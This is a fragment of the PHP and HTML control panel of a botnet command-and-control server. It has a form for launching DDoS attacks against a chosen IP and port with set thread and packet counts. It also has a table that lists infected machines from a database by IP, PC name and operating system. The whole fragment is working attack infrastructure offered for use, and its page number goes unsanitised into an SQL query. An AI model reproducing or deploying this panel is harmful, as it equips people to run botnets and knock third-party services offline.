					<h4>ADVANCED DDOS ATTACK</h4>
					<form method="post" onsubmit="<?php Scommand_json_Addos() ?>" name="cbots_advddos">
						Target <input type="text" name="cb_advddos" placeholder="Ex: 192.168.0.10:80" required> Threads <input type="number" name="cb_advddos_threads" step=1 min=2 max=10 value=2> <br><br>Packages <input type="number" name="cb_advddos_packages" required> <input type="submit" value="Attack" name="sub_addosattack">
					</form>
				</div>
				<hr size=3px color="black" width=580px align=center />
				<div id="info_bots">
					<h3>Bot's Information</h3>
					<?php
						//Query for to get number of total bots and bots online:
						$bot_data = mysql_query("SELECT * FROM bots", $mcon);
						$bot_data_linhas = mysql_num_rows($bot_data);

						$bot_data_status = mysql_query("SELECT bot_status FROM bots WHERE bot_status=1", $mcon);
						$bot_data_status_linhas = mysql_num_rows($bot_data_status);

						//Show on html bots informations:
						echo("<lable style='font-size: 16px;'>Total Bot's: $bot_data_linhas</lable><br>");
						echo("<lable style='font-size: 16px;'>Bot's Online: $bot_data_status_linhas</lable><br><br>");

					?>
					<form method="post" action="" id="cbots_refresh">
						<lable style="font-size: 16px;">Refresh Bot's</label> <input type="submit" value="Refresh" name="c_refresh" id="sub_refresh">
					</form>
				</div>
			</div>
			<div id="main_bots">
				<table border="1px" cellspacing="0">
					<tr>
						<th>STATUS</th>
						<th>IP</th>
						<th>PC NAME</th>
						<th>OPERATION SYSTEM</th>
					</tr>
					<?php

						//Show bots in html list:
						$max_itens_page = 23;
						$numpages = ceil($bot_data_linhas/$max_itens_page);
						$begin_page = ($max_itens_page * $page) - $max_itens_page;

						$bot_data = mysql_query("SELECT * FROM bots LIMIT $begin_page,$max_itens_page");

						while($bot_data_array = mysql_fetch_assoc($bot_data)){
							echo "<tr>";
							if($bot_data_array["bot_status"] == 0){
								echo "<td><img src='images/off.png'></td>";
							}elseif($bot_data_array["bot_status"] == 1){
								echo "<td><img src='images/on.png'></td>";
							}else{
								echo "<td><img src='images/no.png'></td>";
							}

							echo "<td>".$bot_data_array["bot_ip"]."</td>";
							echo "<td>".$bot_data_array["bot_pcname"]."</td>";
							echo "<td>".$bot_data_array["bot_os"]."</td>";
							echo "</tr>";
						}
					?>
				</table>
				<div id="bots_pages">
					<span id="font_pages">
						<?php

							//Code for to select bot page and
							for($i = 1; $i < $numpages + 1; $i++) {
								echo "<a href='index.php?page=$i'>".$i."</a> ";
							}
						?>
					</span>
				</div>
			</div>
		</div>
		<div id="botom">
			<div id="bt_image"><img src="http://i.imgur.com/3NyyE66.png" width=60px height=80px></div>
			<div id="credit">Scheduled by Mouse_BL0ck.<br>
				Who does not know how to program in php ?<br>
				And it's shitting for you...  <br>
				...yes me.<br>
		</div>
	</div>
</body>
</html>
